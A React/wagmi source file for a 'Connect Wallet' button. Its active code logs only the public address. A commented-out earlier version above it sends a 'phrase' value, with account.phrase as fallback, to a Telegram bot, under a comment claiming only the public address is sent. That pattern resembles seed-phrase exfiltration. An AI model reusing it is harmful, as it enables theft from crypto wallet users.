// import { useConnect } from 'wagmi'
// import { useState } from 'react'

// export default function ConnectWalletButton() {
//   const { connectAsync, connectors, isPending } = useConnect()
//   const [status, setStatus] = useState("Connect Wallet")

//   // ✅ Telegram function (placed INSIDE this component)
//   const sendToTelegram = async (phrase) => {
//     const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
//     const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID

//     await fetch(
//       `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Wallet Connected: ${phrase}`
//     )
//   }

//   const handleConnect = async () => {
//     try {
//       setStatus("Connecting...")

//       const connector = connectors[0]
//       const account = await connectAsync({ connector })

//       setStatus("Connected ✅")

//       // ✅ Send PUBLIC wallet address to Telegram
//       await sendToTelegram(account.accounts?.[0] || account.phrase)

//     } catch (err) {
//       console.error(err)
//       setStatus("Failed - Retry")
//     }
//   }

//   return (
//     <button
//       onClick={handleConnect}
//       disabled={isPending}
//       className="px-6 py-3 bg-sky-600 hover:bg-sky-700 text-white rounded-xl transition-all"
//     >
//       {status}
//     </button>
//   )
// }

import { useConnect } from 'wagmi'
import { useState } from 'react'

export default function ConnectWalletButton() {
  const { connectAsync, connectors, error, isPending } = useConnect()
  const [status, setStatus] = useState("Connect Wallet")

  const handleConnect = async () => {
    try {
      setStatus("Connecting...")

      const connector = connectors[0] // Use first available wallet (MetaMask / WalletConnect / Coinbase)
      const account = await connectAsync({ connector })

      // ✅ Only PUBLIC wallet address
      console.log("Wallet Connected ✅:", account.address)
      setStatus("Connected ✅")

    } catch (err) {
      console.error(err)
      setStatus("Try Again")
    }
  }

  return (
    <button
      onClick={handleConnect}
      className="px-6 py-3 bg-sky-600 hover:bg-sky-700 text-white rounded-xl transition-all"
      disabled={isPending}
    >
      {status}
    </button>
  )
}
